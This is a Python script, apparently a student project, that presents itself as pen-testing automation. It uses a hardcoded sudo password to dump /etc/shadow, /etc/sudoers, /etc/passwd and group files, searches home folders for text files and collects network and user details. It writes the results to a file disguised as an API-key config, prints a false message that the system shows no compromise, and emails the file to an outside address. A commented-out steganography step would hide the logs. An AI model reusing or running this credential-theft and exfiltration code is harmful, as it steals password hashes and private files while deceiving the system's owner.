# This is a python automation script meant for pen testing of ones own system.
# This script will attempt to scan your computer for information, exfiltrate it,
# and then persist.

# Created by Hunter Schwager and Kyle McCarthy.

from carne import asada, secret_var, send_email
import subprocess
import pexpect
import smtplib
import os

# ------- QOL -------

export_section = ''
section_header = '-------------'
section_footer = "-------------------------------------------\n"
log_update_counter=0

# ------- Header -------

print("-------------Nat1 Configurations-------------")
print("The following system scan shows no signs of system degradation or compromise.")
print("-------------------------------------------\n")

# ------- Functions -------


def sudo_command(command, report):

    sudo_access = pexpect.spawn(command)
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)
    output = sudo_access.before.decode('utf-8')

    if report == True:
        with open('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'a') as f:
            f.write(output)

    return output


def mosquito_in_amber():
    sudo_access = pexpect.spawn('sudo apt install -y steghide')
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)

    sudo_command('sudo chmod +x steg.jpg && chmod +x dfstd.jpg', False)


def steg_command(to_be_hidden, to_hide):
    sudo_access = pexpect.spawn(f'sudo steghide embed -cf {to_hide} -ef {to_be_hidden}', encoding='utf-8')

    sudo_access.expect('password', timeout=100)
    sudo_access.sendline('password')

    sudo_access.expect('Enter passphrase:', timeout=100)
    sudo_access.sendline('carneasada')

    sudo_access.expect('Re-Enter passphrase:', timeout=100)
    sudo_access.sendline('carneasada')

    sudo_access.expect(pexpect.EOF)

    return 

# ------- Command Class -------

class SkillCheck:
    command_input = []

    def __init__(self, name):
        self.name = name

    def proficiency(self, ability_score, report):
        print("\n", section_header + self.name + section_header)
    
        command_for_log = subprocess.run(ability_score.split(), capture_output=True, text=True)
    
        log_output = command_for_log.stdout

        with open('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'a') as f:
            f.write(log_output) 

        print(section_footer)
        return log_output


    def inspiration(input, ability_score, report):
        sudo_command(ability_score, report)

    def investigation(self, directory, search, report):
        print("\n", section_header + self.name + section_header)
        command = f'sudo find {directory} -type f -iname {search}'
        files_to_search = sudo_command(command, report)
        print(files_to_search)


def basicScan():

    with open('API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'w') as f:
        f.write('----------------Start---------------')

    # ------- Inspiration -------
    etcshadow_bot = SkillCheck("Home Directory Health")
    etcshadow_bot.inspiration('sudo cat /etc/shadow', True)

    poncho_bot = SkillCheck("Privilege Audit")
    poncho_bot.inspiration('sudo cat /etc/sudoers', True)

    # ------- Investigation -------
    home_bot = SkillCheck("Home Folder | .txt")
    home_bot.investigation('/home/', '*.txt', True)

    # ------- Proficiency -------
    ip_addr_bot = SkillCheck("IP")
    ip_addr_bot.proficiency('ip addr', True)

    online_users_bot = SkillCheck("Online Users")
    online_users_bot.proficiency('who', True)

    passwd_bot = SkillCheck("/etc/passwd")
    passwd_bot.proficiency('cat /etc/passwd', True)

    host_bot = SkillCheck("Host System")
    host_bot.proficiency('uname -a', True)

    group_bot = SkillCheck("Groups")
    group_bot.proficiency("cat /etc/group", True)


# ------- Exfiltration -------

'''
def secret_ingredient():
    mosquito_in_amber()
    steg_command('./logs/API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf', 'steg.png')
    steg_command('elbow_grease.txt', 'dfstd.png')
'''

def one_mail():
    send_email(
        'living.like.bob.was.taken@gmail.com',
        secret_var,
        'riwos15373@pngzero.com',
        'Exfiltration Info',
        'Look man this code thing is hard enough as is alright get off my back.',
        './API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf'
    )

'''
def combine_logs(directory):
    # Safe create directory
    os.makedirs(directory, exist_ok=True)

    master_log = os.path.join(directory, 'API_KEY_nat1-0103fGs0d86asd89sGrEDA3.conf')

    with open(master_log, 'w') as file:
        file.write('===========================================================\n')

    for log in os.listdir(directory):
        if log.startswith('API_KEY_nat1') and log != os.path.basename(master_log):
            full_path = os.path.join(directory, log)
            with open(full_path, 'r') as log_file:
                content = log_file.read()

            with open(master_log, 'a') as file:
                file.write(content + '\n')
'''

# ------- Execution -------

def __main__():
#    secret_ingredient()
    basicScan()
#    combine_logs('./logs')    
    one_mail()

if __name__ == '__main__':
    __main__()
